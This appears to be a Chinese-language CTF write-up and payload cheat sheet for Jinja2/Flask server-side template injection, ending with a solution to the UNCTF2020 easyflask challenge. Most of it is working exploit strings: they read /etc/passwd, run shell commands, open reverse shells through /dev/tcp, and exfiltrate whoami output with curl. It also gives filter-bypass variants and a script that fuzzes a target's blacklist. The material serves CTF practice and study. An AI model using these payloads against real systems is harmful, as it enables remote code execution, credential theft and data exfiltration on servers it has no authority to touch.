    # coding=utf-8
    # python 3.5
    #jinja2模板
    from flask import Flask
    from jinja2 import Template
    # Some of special names
    searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
    neededFunction = ['eval', 'open', 'exec']
    pay = int(input("Payload?[1|0]"))
    for index, i in enumerate({}.__class__.__base__.__subclasses__()):
        for attr in searchList:
            if hasattr(i, attr):
                if eval('str(i.'+attr+')[1:9]') == 'function':
                    for goal in neededFunction:
                        if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                            if pay != 1:
                                print(i.__name__,":", attr, goal)
                            else:
                                print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")
###  0x01:常见payload
有现成的payload肯定用起来香啊，还是总结一些，方便之后自己再做类似的题目参考
**python2**
    #python2有file
    #读取密码
    ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
    #写文件
    ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
    #OS模块
    system
    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
    popen
    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
    #eval
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
    #__import__
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
    #反弹shell
    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i >& /dev/tcp/你的服务器地址/端口 0>&1').read()
    ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/xxxx/9999 0>&1"')
    注意该Payload不能直接放在 URL 中执行 , 因为 & 的存在会导致 URL 解析出现错误，可以使用burp等工具
    #request.environ
    与服务器环境相关的对象字典
**python3**
    #python3没有file，用的是open
    #文件读取
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
    {{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("dir").read()')}}
    #命令执行
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
    [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')
其他的就不再一一列举了，可以参考Github上的。
###  0x02:Bypass姿势
**拼接绕过**
    object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
    ().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
**编码绕过**
    ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(
    #等价于
    ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")
**过滤中括号[]**
    #使用getitem()\pop()
    __mro__[2]== __mro__.__getitem__(2)
    ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
**过滤`{{或}}`**
使用`{%`进行绕过
    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
**过滤_ 和引号**
**可以用`|attr`绕过**
    {{()|attr(request.values.a)}}&a=class
使用`request`对象绕过，假设过滤了`__class__`，可以使用下面的形式进行替代
    #1
    {{''[request.args.t1]}}&t1=__class__
    #若request.args改为request.values则利用post的方式进行传参
    #2
    {{''[request['args']['t1']]}}&t1=__class__
    #若使用POST，args换成form即可
**过滤.**
可以使用`attr()`或`[]`绕过
    #attr()
    {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}
    #[]
    {{ config['__class__']['__init__']['__globals__']['os']['popen']('dir')['read']() }}
**reload**
如果`reload`可以用则可以重载，从而恢复内建函数
    reload(__builtins__)
## 三、题目实践
###  UNCTF2020-easyflask
存在SSTI,先fuzz一下，看看都过滤什么
    import requests
    from time import sleep
    dic = ['config','class', 'bases','_','\'','subclasses', '[', '(', 'read', 'mro', 'init', 'globals', 'builtins', 'file', 'func_globals', 'linecache', 'system', 'values', 'import', 'module', 'call', 'name', 'getitem', 'pop', 'args', 'path', 'popen', 'eval', 'end', 'for', 'if', 'config']
    pass_dic = []
    for i in dic:
        url = "http://6f38b1e6-520d-47ff-a72b-14e481f513cb.node1.hackingfor.fun/secret_route_you_do_not_know?guess={}".format(i)       
        res = requests.get(url=url).text
        # print(res)
        # sleep(1)
        if 'black list filter' in res:
            pass_dic.append(i)
            print(pass_dic)
过滤了`' _ [
]`,那接下来就要思考怎么去构造payload了，上面总结的payload直接拿来用肯定会被过滤，因为大多数涉及到了`[`,但可以使用`|attr`和`request.args.xx`来绕过下划线和引号，只要明白原理，便可以使用上面的payload修改一下即可
    {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}
拿这个payload进行修改之后
    {{()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.getitem)(117)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()}}&class=__class__&bases=__base__&subclasses=__subclasses__&getitem=__getitem__&init=__init__&globals=__globals__&d=get&e=popen&f=cat flag.txt&g=read
payload有很多，只要能从基类获取到全局变量，之后一步一步调用就可以
## 参考博客